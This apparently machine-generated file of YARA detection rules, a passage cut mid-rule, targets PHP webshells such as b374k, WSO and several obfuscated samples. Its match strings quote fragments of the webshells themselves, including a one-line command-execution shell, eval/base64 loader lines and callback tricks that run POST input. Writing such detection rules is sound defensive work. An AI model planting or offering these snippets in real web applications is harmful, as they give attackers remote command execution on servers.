      $s11 = "J5l3945ZcMdQLNiJeJfFJEDRWhrqOi8TvLS/WK/0FAF90mBfrsstg+b6j07xYoW5zKoc6Dv552+6iMyBhKfzrXLXgqT+E5jEa6TS7zUkEvWb1umm+gnjSH4CxK3FJ4ET" ascii
      $s12 = "8pUXfiQ1lx9wRlb6P+AQ8i4kyQ5U7jRwMIB4B/0F+dbRviH4iJ9z37FwY+B+Dx+gIFJiXBssCDw/V9oY3eAIGgI9QJ9D0PALXPCmDYqBiPkQ+Mu4E3TUBp1KQNVgSOpX" ascii
      $s13 = "rtCetHZhftcbZXnYtZdS5uue5+VitMp040WpRtGhKqVRynZocWU6pGwezklgnzc0+R3YWxn4wS1kzszTIJu3aximaxZkwIaXaeNaeC3lghrL10X5ulFurlBLPc2qOFdU" ascii
      $s14 = "x0TNu+p3net8/PcGlB7fCGJ2tmqLEA2qQyAOcQSCOMBYEiiyFu2n06kkODPzBMjjkWXrnNtydMGA5gWvjWjU0LYVwz5HUvTubf0p8/iB9QckfU5/RLN4vhU5wAES35uz" ascii
      $s15 = "uneZKU3m1dVZ8naQ7xJYbjuLVTGMl17M9O6OxopIrcflKo3ywFX0gKZlSr3/MdQvVeHoxzHdzgt1KtrpUoi4nzIJeElhyNJFWg4muJlat5Ca3XpkG65SGq/2qaSyScqO" ascii
      $s16 = "0Sa1JpulaZWtrNBUfrPfj6ihFFqR5Lr+rjMyl1tVMrdIqEGSyfLQ6OeCyxB1nVh8SR6m4q+h9eZSeL/XmejEic+vhcTXuUVvbNgvdKehak81+ILaUzkbZMBlu2bUco9d" ascii
      $s17 = "dVjh7umKUuVI2m5nBEIx9o1IivVuze2XbrcxJxZEsbtOYNxN23RKLxVGZEgdOa2j0nLqmTBnbGPeOG1miSgxwS6SSLshzbWGv+ibRilfGiX2tu+cLbTNnzEvmAoxpKdN" ascii
      $s18 = "s56LFTxF8NMHYALs93hbz2YK6iXmHX2HmPQfI0+H7s+0bDxQ64L7GxJ/SKS8ke0Btrm0bQKpuqdB250l6xBXz6ztwAdF6I6XXCIGUi42QgCcXHJx0L3zQ2YTQDQHyDgc" ascii
      $s19 = "oBS25PmwGy7reJgtdU5rtVkuh1mwP1t013U73R2C+qOfMfaYfZ8xF3OZn1cFWzBaKuUHyUBRqleE4v+gnitqRKE+yi9SsRi6bE7O0mmqFXMkgBRV4sgWzVR7ua8NKfLP" ascii
      $s20 = "HtzL9Vj3bqDwzXvgdL/fRcPiD1vYvJlYcWMqDwedIzpvLO3L728ngYbVCUN4xlN/OLGVAu66dnQLT2W/Rrp/xVvsrG37+1nr4aAA8mXx9Yx234/VhLHB6OXy45MbIhEf" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_3_poly {
   meta:
      description = "webshell - file b374k-2.3.poly.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fb6b7b6e5b5e8d78547a5cdc56956f9f674606c91b2cea2d3f2fb231cd568f79"
   strings:
      $x1 = "$b374k=@create_function('$x','ev'.'al'.'(gz'.'inf'.'late'.'(bas'.'e64'.'_de'.'co'.'de($x)));');@$b374k(\"HJ3HjuvcckZf5cLwwAYHzAm" ascii
      $s2 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s3 = "jOaTfxseVEutuy59VZWXpzg2OR1f4PVfH5224oqIAf9lfZ8aCH4DUajTciq3vcwiyuGkL5/EYeS/SmAffagtADzKDPhlX22hMsfK9TY2O/iykQ6gMyNl5I731+/96MFW" ascii
      $s4 = "8HX6MpSg2xBetK5LBCEQgDhfXwbDf5SK3WAOVR23oxwtEQdGzDO94uX3MJFI4Qp0cv0PT4yJJymDOSgMn7BPVBQwn/yi4BwsLWodAs7f2QJVUqFQMiO3U6xxBlHNtTwr" ascii
      $s5 = "KonsZ+9kqVplt2q+KLtcjCs8222UUyAEXG3geTuSx7UAZ7grdqpRV1pbK6AxXXIjzRwVqeGGy1Kmfml8QP2bhHC9kEZWl8brwV3//J6kWQUFSwRdjTAbaofMvnW7+s1V" ascii
      $s6 = "p2txNdXrg2/+1TPYDj48Fd5EWuHL/rgegNTXd9byLpzo2bcm62qT2F/yctfqQonho+BXjDVbArihduf1o5w7i4NXnmK4ftp39dVJTMEK2nNSqSXv9tXANMevd7vhSNwq" ascii
      $s7 = "qZkf2tfpOF71ndaY2Mnd71u1J7+w60FwM0rbKjlhfuXfT2GO2GpM8zCd3OgIyuSAGe6xURnVBXUa3MUpiHZ+r9vs00W80vrVZxEdgt+JjR8iEvjumTKIzcJizNW8gKvM" ascii
      $s8 = "YcdwYsf+5GO2HWifpejwRiCGnUM426sWlUtuSPkZbdkILEGa29Z6ZKPPn0hWcz+AxzNIQE+y6yQFCtiFLOGm5it7QD4h8Fou2+se7Y6gjhE8SzqtBwjXmpdfzIS59WQO" ascii
      $s9 = "uztqWW/1U+ViQ9MYn8K4AN5Ox8a/4s6nfCiJP/XcRQO5Lzes3i7SVH/fbPEK0nQVwGiBudlu3tKz5yGVVCNSop7d5YpOJj4HgATyocQGEtLOP3qdQgAqEWpE0AtsaTt9" ascii
      $s10 = "2aI5YdDuw3/k23tr6tmTBk6Fhsw9w6Ldj1Lj2O+L5/Hgsk/xlEgop8L9aA40KgvJM462ssl3HY3de+dOSJRIp5CKXvXzeyEiKK6KU3xbSH6RxtgzYu/Sc9nZocFVhScT" ascii
      $s11 = "6IxN1ogr5TZl4MhehNUhFkW9i129holJ0u2VcQLoGKwSjU/MLWUdIafQNjt71pQpurzMCmhJSwoyZ6srW4JkfUjTB2iS9Eqbq/pVzwe4srl3zX19GyFNM5qGZE959fhg" ascii
      $s12 = "JJ2SAMm7Cmwq9oucLaL98wMS5s59tAf5iD/QSYGNCrVlEXZEUv++lfi7hWz2DqvtoEM4gpZI89P9SCU2HFKLn3JhB8KAfzMXCyKtDF6yChrbMTmrkOio+lJBkNgKu9sn" ascii
      $s13 = "y6+YQNJv+WsXSqMZeafewH7ni63SjU/FP4B45K0vIUPms22EQGcuCu3jrYhYH1ip3OdJBtmBTv36644HtbXcN0qSGnaPDBCoWoaqIYeow4Ve6IGV1scSrMe4o7M8xQPi" ascii
      $s14 = "sGk9JsMOZmS30ZOfqucmK+xUBleBX4kOsUeblXfiQbM/AquocuO1utc9BJ0q6ZvVmJX+Mp/6SEnfzPwD3a8N44ALW0Jl0lOTqrHVCEc6fQJxNrCmQODi9TwpTa6LQG84" ascii
      $s15 = "+1UODF4N5CfDXmOgLx2s5jCto0WSf66dts7WjIvj0ITwa07q9SUnzhkn7nSowkz4Bg+C+RbRwuWF1VyIgjaQAu+S1Zvsr8ij/u09CkEymWNjPAgmc96hsk2LSCCgMc6K" ascii
      $s16 = "ZoNplHKhrw1LKe3qyRdfAiBS99JVpyBVKDFG92cOm3Ci8yrneFOaeNBnEvqix+q9SymyQAiKqsA2VYt0bcf0l/7t7XVQxkcyrff+npZC8MgjdUe/C0h9hwm7ms1oVvVG" ascii
      $s17 = "cY9K0ni62eeI19fxmKyH9PINaf1d2b4qzVj2FQWexKcJGJz/Rd63nucMdiMCB9EWfiiMRQ1OkO8Po+/ghdRvt60Hs0IWLJ/rjLdbJ7MXHq8ToVUuxbfJnZBXFf1+LyTm" ascii
      $s18 = "Vgc+eVVBin8jVr0QAe6enuVhhyc2MupTYaf0lIgzyzon7Bq/28A+Yh0ZkLhyAxq64U8nJwH+wlkKmpAOO1dFajLScFRKq070sNV4TqKK7vx6reMeY3KHgIhcPHtZs6rd" ascii
      $s19 = "od9m6MWV4Qc++sZpawjN88n15ZGwniK6WTogUvrV1B287dBf/A0YqP3Tcw7GXaqRJJ2OrUnLt9TBgkcOyMMBwUIUa1ogcsDTWDS5wGCOhAw4XgqSeqxgvYiqWtPXD27g" ascii
      $s20 = "1jujVd4X+H7YqWinl0Flmaecl9oPdtLCGgUBINHc4m//4kW/tKrsA0zrVczZ7PT3Bd4cZJv96YtpF1TTiFLM7ASEi52g8AVhRqAQDqH8jeXPkwY6K/dbB7FqFMCPwafL" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_3_min {
   meta:
      description = "webshell - file b374k-2.3.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8a135a43f89ece1279562bac80061bbaf1581f8a5055f96c57407b72a7ac188a"
   strings:
      $x1 = "$b374k=@create_function('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'.'( bas'.'e64'.'_de'.'co'.'de($x)));');@" ascii
      $s2 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s3 = "JjR3TgxAfKUiqPtSpnFb2A6zrTFgqysPzc/4We8IgLgUIzJPDllFS7tcrRxKv88+NzJipfv98TtIE7ftwkgYvhAeMMBQ0GOdxykxX+eIwQA9fxm6gnjO74TpD/dMMYLS" ascii
      $s4 = "B0++UFxjC/4x83de3BaYxeLswxpkulKMwPvrv3yTRASIkzhvU7GtlOUABHVgYAoVIt89lCpqZcdbpdTEJMIyujr/R5drJ92FH65D54aR/bBu5+ifw9itRdlLwkk8SpXN" ascii
      $s5 = "fzb+NP5u7wJ/wlnmtv+P/zrs9uiQK9rDhHgwUaAi848Bcy3/8W+4gAThGVaFtcH9nh7YjaHeAw/9+dhlUlA7xfUjwfcZdUCdXa4EyDwd+hr+OU/CkdllQ1RdAOHf3cCT" ascii
      $s6 = "STTnYjzajUqmgar5SbhXCsNTGqdAOO31V6NW7jtnZZKbGvG+XaDUfFDu7/HKoLlqDgkLTI70zzWIuptRZoSPy1lba7vGMTrtsgep0PKXOa2MFy07ocmmrVacKC1yoYEe" ascii
      $s7 = "lRbXYNGiValVqy26+PJbZoLQfKVWrWxuUM63SXMMGZKVZa7TYHD4L6exyUR3uaguzSgbkvlIkqQAfTqUiy84Wo12WNbqeZNfCjDhb8eyEFrZ+sV+3nAYbemuqVTc5UhM" ascii
      $s8 = "n94u85GKPy8G88DnfGFkoGu4iFW1agvSiMfAwVxpDewS/pO5//r9//zXz8HdMgetWoApAsBUJCggQu9fRsWELHnk/Y+0DzIdDyHoyM+KbXtJP8crjDYYC1mH1HGc0TQ5" ascii
      $s9 = "y5U+XIvmEb1+vuMOaIfy3Mi7EAVdEkAtzcNUSEpJbWsFoXF/PiDv2uro8OW+RMAdcObypAaNoseOMUA1Q+Q3uT65cSIY/hj3vunzERjFfJLR+I7deq+nAr2hsEx5Lhhu" ascii
      $s10 = "2oAD3GFvD1JZyERiCIVvQ+WqpwG2rnDSQV6EaaltW7TK8ug80cj5bmjVXLHiaP6rjpsZkmt5CJtQtMPfksNgQLGxlMq60zrB8s0aLa2XrzKqZapFilP6OKvStzIoFk7i" ascii
      $s11 = "5BdHjWrO1tq+slpY5Dyly3O651qYf9mfDLgtX9qlmg9o0csR8HYbZpsi3a/pukF+Nmg02Y/gbokBlu4XRTgeu0D5nUg1tNt10pgttwVi92mLruNvceLVRqM2m2d/77aY" ascii
      $s12 = "iGFWBLmYB6aDT/w6/UeZTKg1qRUtGX8KUSFZ+gi8jeXo+6eIzTafMdiZ2X/E2JPyI5OkEyxsT91jwKjMkNR6abEZLjRcz/fdIEh+jqU8V2knqtdM9UYAY+Ht6ruddcvL" ascii
      $s13 = "6nh1uSLPXUgjOJAo4ZVXcVkD0uqM8ni1i9U6nz2VWmQbuubXMYkTmp5lufpKZb8OZRnWZccshdgZfIgt1SyQpfu9ugKLRupvCShjKeG/BZJgx3+92clIpo1YJbLVfdLu" ascii
      $s14 = "JozFMP76GiEQ5dH9hJY9nmv7hqtmP+iFOPLHuIRPA+0gSmRadGOXQPsVtu1+zrwhF+99LKNp/CsWjULS/g1C0v5NQtL9FKNp/CsV/EqFIDIjGFFmYqdZkNExpjA0vSnm" ascii
      $s15 = "CqwQz+nNGnOFitbVz2F25OsBG+bLV0vN6yVuzHWfluzWjvp7Mcac43BtUkyzvjdCqKeSiXlyX3abdkburhtOt58iO1d0M+8veYEBsKSpbzfdws+PZzZpRM2bd9qg0HbS" ascii
      $s16 = "5/3x4Vf2tIOvjRL2l9W7Q0ornQeo+MsUY9eG70xVXcanFb1D0N521zQ8HIq4EuF8aU4mK/YQZFTPW55hS8VjCEyKpPPj/LPz7xsB+S/z9qTH0IwZmxZU48e8wK79g1ik" ascii
      $s17 = "FzGiq0D6x3QSMSo9VylcJRdqRNm70xIzpdYubVXHHuNlJ1egpKjcZA98Zs2a21zXtfls3yxTuldvKUuNXTYstZ6arQbXt5LoGXpNGo1CaEVI2r/r+2Od2Wn+F+6uF3hq" ascii
      $s18 = "dLAWZeV5Z026u6zaBqeSN+o0pWxfzWWOvCAO63MuXZlKOJSy+sXKDujnkV1LYX5JGcZgdk/nKKKOMS7bUs1o4VunXM9V5gZpvMeDlLydFzsWDrbwp7HYsb9VxgtNzwpr" ascii
      $s19 = "xnfCsmRJvSpoPwF/U0Zst0P4FfvRlnznaIwBPLkwD9mEyUj+ahwlgJaMJOBqtSyQ4oE97O8osDiAC6A8XrSpQJsBde/Pj4f6LT9QHZkxUUVQp8oB1iMY8CeP9Hkhu8yW" ascii
      $s20 = "d57LjUYbxpjumn2uKdL3BDAHuUiYD3IYJO9gvQYebJrDcFNbxOGtTbjuCv6ky2rSqrEsjdd1RPGzie2EL02dyfV3ywo3fW+X2a8Y03HI7L6sLZqS7k9pyOspT3GJh5dV" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule wso2_5_1 {
   meta:
      description = "webshell - file wso2.5.1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
   strings:
      $s1 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s2 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s3 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s4 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s5 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s6 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s7 = "                wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s8 = "die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>\"" ascii
      $s9 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s12 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s13 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s14 = "show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stde" ascii
      $s15 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s16 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s17 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s18 = "echo '</select><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_e" ascii
      $s19 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s20 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule other_decode {
   meta:
      description = "webshell - file other-decode.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
   strings:
      $s1 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s2 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s3 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s4 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s5 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s6 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s7 = "                wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s8 = "die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>\"" ascii
      $s9 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s12 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s13 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s14 = "show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stde" ascii
      $s15 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s16 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s17 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s18 = "echo '</select><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_e" ascii
      $s19 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s20 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule webshell_php_get1 {
   meta:
      description = "webshell - file get1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2c2b48e4cf46beb273724b06d269b2959436db2e98399b8cf92124965b18b1d1"
   strings:
      $s1 = "<?=`$_GET[C]`?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_pas {
   meta:
      description = "webshell - file pas.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d584a129845dc3a3b380bad24481e8ec5abd38f9bc67eb05c909edbb46b7a1d0"
   strings:
      $s1 = "'));if(isset($_COOKIE['sP']) && $_COOKIE['sP']!==NULL){$g__g_=$_COOKIE['sP'];$g__g_=md5($g__g_).substr(md5(strrev($g__g_)),0,str" ascii
      $s2 = "'));if(isset($_COOKIE['sP']) && $_COOKIE['sP']!==NULL){$g__g_=$_COOKIE['sP'];$g__g_=md5($g__g_).substr(md5(strrev($g__g_)),0,str" ascii
      $s3 = "lk9UiLvl/sjTbD7wXIRC+oEFyzzAPKttv8ex7ilFNlJ+nMwEnK7+QsBL6k5fE3WDBMC4xLoF8Hs/kZp6" fullword ascii
      $s4 = "WxJ4QZ4FjXPnf/qoJQZiVRO6tWblhC7ju1T5oiHud08BIcQ799DNhIfX+iaxqDLLJO5gS3Qvl+gQmJHj" fullword ascii
      $s5 = "EMSYShVyEyezJGqO68mLal3NGdXZNa/fBmPvsaCV32AJNVph6n5jcf8/eyw73BkgvXg0DEXpjtlI1QGC" fullword ascii
      $s6 = "XlOGgoIqGVWVayZvjHbCNDR0/Qw4aZ+IBUEdCJv3mVHnHQ5dTqq2gG5FhzcZFxYx6iovWcziGpfnZ+aI" fullword ascii
      $s7 = "qAhvcjBwy2HHxB+EPFT/1MoFdrVQYhkQLUQmgqaxI4IrCJlReuxEZ44MQG4YNWgxmwG5So1oPbhm2Y7V" fullword ascii
      $s8 = "0mdgx8xngHqGlOEReZ8PvvpIb/izKnJ8Wc2hOIRcE2IBX+g+Js3TZn19io5z7CKJXHkWnkQ5+hoSFQkn" fullword ascii
      $s9 = "();}} @header(\"Status: 404 Not Found\"); ?>" fullword ascii
      $s10 = "E0Rkb6HYBwqkjTYNK6PAssAaNPuSsPKFNTpWF0GeJufqYhqIWVjF6sP4J1XASgJJTwgaJ7nyQ/0Lw7qk" fullword ascii
      $s11 = "qTCyk0G40SU248g5hujQcu597SReAdIh/RRD0fH4gj5p0jeTg4vZ874Lkw/5GiXf3mmMTZBYPr50kGXf" fullword ascii
      $s12 = "tmPq4QZaWvYa+fm1Gspsf10U1MlPBzPw+rfGQbwXpaZRoxC5XQHr2dI9nzWaDClQAztdcW8x0qPrgX6Z" fullword ascii
      $s13 = "etIdWeJWNT4VF+2qirxrfn0iP+VuuCVX/CfkwctDDN9v5fqPWSPwndchy8xtHR+TPgcWfSgc8aBSAjIH" fullword ascii
      $s14 = "oSa9boZWigI/q6chvQgo7xIzoIcBlC9LFhlqCZQ85eiuTnyjXej3wcEgGy2kPj0hhsXTY/l1cEx/wXOu" fullword ascii
      $s15 = "W1M3CKspduypLmdNroXT8TL0J27NdpjvfAJxZDU2LqHhHtA/9g0dfXZDGupBAfXdYGJGTMHV9xFfiKs9" fullword ascii
      $s16 = "nKHyfxMXPQp9MsN0srD+WkRLqOdUCbkj6CiyOfADc7FY0cr/soT3Fq9Q8ydFt+gsFs7UnWApWXeSk3YO" fullword ascii
      $s17 = "EasHOl8Y03IvNKSWwKapG2BgmroRt6JSe9Rl59EQMYuw9khqMM3XiMa+3t/dcOcWZbwC8dj4qtMOv1Dh" fullword ascii
      $s18 = "fppxOqgdiX4cN72NIlYNHtlAEOMNnlfVtW38hUS+H9x/DCe9iZQTxhfktwX15JnliuKZ4Vi7kxXGvB9b" fullword ascii
      $s19 = "+JWijjvBawGRJCGg4460V1buL0vZXU4Ufqzzo5X9xaipIcUA1+Uqa3E/KAvOcu9YBGe4eOmHOM+KAHO/" fullword ascii
      $s20 = "CzE5LFg2KGsBt/QCBf84NrVxAI1Lc0fpGf0r4uXEL/5xcqhHgB6CgwUAoWcMYzAqqlCo11RdVUOeVSYt" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule wloymzuk {
   meta:
      description = "webshell - file wloymzuk.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "65df81eacb52ac63ef263adb1768b96b39524ed47f1080d520331b82f5abb710"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_ivzrh($fgnex); " fullword ascii
      $s2 = "'fXXxbaWYoZSk7bXRwaCgnPmdlLCc9KXskeyRwJywycGhwcj1wZnRfdWcoY2xpZyk7aX'." fullword ascii
      $s3 = "'0J2RlZShzdDokZGViZ3RoYmxpbmFtPSdDJG9wLT5saXRjPCcpc2VyaGlzcnkocmFuNS'." fullword ascii
      $s4 = "'09ZSgidHIgb24gamVjXDEzcy0+ZXh0Y2spYyAkY29kaGlzcm93ZW5jc210PScndF9yc'." fullword ascii
      $s5 = "'uPmVudGhpZWNpbGlkeT0kfScuc2U7Y3RpYWNoQ09OIHByb2R5ZGVieV9zLCdlLCR0aW'." fullword ascii
      $s6 = "'YWxzb2NrZXRfaGlzcHRpc29tQ29ueSgpJG1hZSl7Jy4kJGZybmQocy0+ZW5kYWdlLT5'." fullword ascii
      $s7 = "'gpX3RpdCl7aW1ldXRwZGVGeT0+JG1bJHRoQ2hhYWRkPXN0ZXk9b3IhPmhlYXN0aXNfP'." fullword ascii
      $s8 = "'RUJVfXN3ZmFsOyRldWlkKTtwaHJ1PlthYm9kZ2UodGhpb3VuMS05aG1lbmFyIWFydGh'." fullword ascii
      $s9 = "'1ZGF0ZXR1LCRscy0+fCg/aXMtJGVyRUNUcGhwcj0kKXtyc2VsPmxhZXRGZWFkKi1cdC'." fullword ascii
      $s10 = "'QG9waD1mdGhpbikgaWw9PShjYWsnT3B0OyRjYXR0LTMpYm91aXRpb3M9TWFpYnN0bXR'." fullword ascii
      $s11 = "'Vscm9yJ0FsKSk7bXBhMDskO319LT5lJykhJ09QZGF0ZCkpKSl7YnN0JGJvRUNUb24gd'." fullword ascii
      $s12 = "'SRpb3VuJGJhdGhpT2F1VE1Mc3Rfb2RlQWx0LTkhKTskeyRkbmQhdWJsc1NoZCwiJywk'." fullword ascii
      $s13 = "'m90cm4gU3RydGVkMDskYWxzb19hcmFuc2l0ODtwaXMtLT5zRUNUO3JleSgkPT4kfXBy'." fullword ascii
      $s14 = "'sOkRFPnNlfSR0cnk9RUNUXSk7aW9uZmVyICRTaW9ucD1uJ2VydGhpX21vVEVTbU5hZX'." fullword ascii
      $s15 = "'XskREVCZihpdmVyaW5fKXskZW5kcC0+JywkeyR0ZXNzYXNlbSgkXHgwcy0+ZHkuc2V7'." fullword ascii
      $s16 = "'9kdWJsLT5zRGF0dWdvLTkteSgkJGFkPnNlJzpyNDE3dG5haCkpcmdlTCgkYXZlO319c'." fullword ascii
      $s17 = "'bdW5keyRzLT5zTy9FKXtjbHNlOyRiOGJpdGFjY3RldGhpb24gLj0kbG8saW5nZXJyZy'." fullword ascii
      $s18 = "$_ivzrh = create_function ('$fgnex', ivzrh (base64_decode (" fullword ascii
      $s19 = "'1wIEBpcycpZXNfaW5leyRybXlYdXQpJywzTEU7X2NvZXJyZj0kbmNvZWRlbG8oZSAnK'." fullword ascii
      $s20 = "'1FSGlbUns1Zlx4ZF5TVnZrJAdzZV5scjE3dHQdY2N0aWRgbWIlcSMEAUVnXkxWYmwkM'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_2020_08_20_16 {
   meta:
      description = "webshell - file 2020.08.20.16.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5760bb70cef9f90ea38be06b2b256ebc565364ac6e3bffafdbf430b785b48046"
   strings:
      $s1 = "    $arr = array($_POST['pass'] => '|.*|e',);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_11 {
   meta:
      description = "webshell - file 2020.08.20.11.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "78ccd90709551d1488eb02dc6a0ba1463eb15a8eb85bd63b21d67f7fabcbfae1"
   strings:
      $s1 = "    $arr = array($_POST['pass'],);" fullword ascii
      $s2 = "    array_map(base64_decode($e), $arr);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_17 {
   meta:
      description = "webshell - file 2020.08.20.17.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6f1e1fd5bff4680d3db9de5185c2f64120d6286ec68b37e40143e9c3acc07d76"
   strings:
      $s1 = "post: e=assert&x=phpinfo();" fullword ascii
      $s2 = "post: e=YXNzZXJ0&x=phpinfo();" fullword ascii
      $s3 = "    $arr = array($_POST['x']);" fullword ascii
      $s4 = "    array_reduce($arr, $e, $_POST['x']);" fullword ascii
      $s5 = "    uasort($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_2020_08_20_10 {
   meta:
      description = "webshell - file 2020.08.20.10.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "93d5e4cef7a2ad290b65a1523a45e246a301852f63e4c32c505dcd0d6f9b906d"
   strings:
      $s1 = "    $arr = array($_POST['pass'],);" fullword ascii
      $s2 = "    array_filter($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule wso_4_2_4 {
   meta:
      description = "webshell - file wso-4.2.4.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
